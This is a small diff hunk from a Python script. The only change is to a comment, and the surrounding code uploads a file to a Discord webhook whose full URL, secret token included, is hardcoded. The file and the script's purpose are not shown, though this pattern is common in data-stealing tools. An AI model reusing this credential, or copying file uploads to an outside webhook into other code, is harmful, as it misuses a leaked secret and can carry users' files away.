@@ -167,7 +167,7 @@ try:
         # else:
         # print('Failed to send the file. Status code:', response.status_code)
 
-    # Replace 'WEBHOOK_URL' with your Discord webhook URL
+    # Replace 'WEBHOOK_URL' with Discord webhook URL
     webhook_url = 'https://discord.com/api/webhooks/1130818781808181248/LHQkasiDbFP2GY6TX7SHyIEndO5o8TJHv8y8hA_ss2I8jxYL9he9zwOoTpphfeICZ90l'
 
     # Replace 'FILE_PATH' with the path to the file you want to send
